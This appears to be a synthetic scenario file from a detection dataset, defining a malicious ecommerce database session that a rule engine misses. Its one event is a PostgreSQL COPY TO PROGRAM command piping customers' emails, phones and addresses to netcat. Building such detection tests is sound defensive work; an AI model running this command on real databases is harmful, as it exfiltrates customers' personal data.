@@ -1,0 +1,30 @@
+scenario_id: gen_ecommerce_26_copy_to_program_mal_677m
+family_id: gen_ecommerce_26_copy_to_program_fam_677
+domain: ecommerce
+time_of_day: 00:50
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: analytics_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT email, phone, shipping_address FROM customers) TO PROGRAM 'nc
+      warehouse.corp 443'
+    connects_to:
+      ip: 192.168.31.38
+      port: 22
+matched_pair_id: gen_ecommerce_26_copy_to_program_pair_677
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
